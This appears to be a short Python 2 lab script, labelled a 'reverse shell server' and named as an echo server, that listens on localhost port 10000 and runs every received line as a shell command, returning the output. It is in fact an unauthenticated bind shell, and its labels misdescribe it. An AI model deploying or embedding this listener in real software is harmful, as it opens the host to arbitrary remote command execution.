#!/usr/bin/env python
# -*- coding: utf8 -*-

# reverse shell server
#
# Usage:
#
# lab:socket/ $  python socket_echo_server.py
# [*] server is starting
# [*] connect from 127.0.0.1:54355
#
import socket
import subprocess

# Create a server socket
s = socket.socket(socket.AF_INET,
                  socket.SOCK_STREAM,
                  socket.IPPROTO_TCP)

# Server address and port
s_addr = ('127.0.0.1', 10000)

# bind socket
s.bind(s_addr)

# listen
s.listen(1)

print "[*] server is starting"

while True:
    # Accept client connection
    c, c_addr = s.accept()
    print "[*] connect from %s:%s" % c_addr
    try:
        while True:
            data = c.recv(1024)
            if data:
                proc = subprocess.Popen(data,
                                        stdin=subprocess.PIPE,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        shell=True)

                output = "%s%s" % (proc.stdout.read(), proc.stderr.read())
                print output
                c.send("data back: %s" % output)
            else:
                break
    finally:
        print "[*] close socket from %s:%s" % c_addr
        c.close()

s.close()
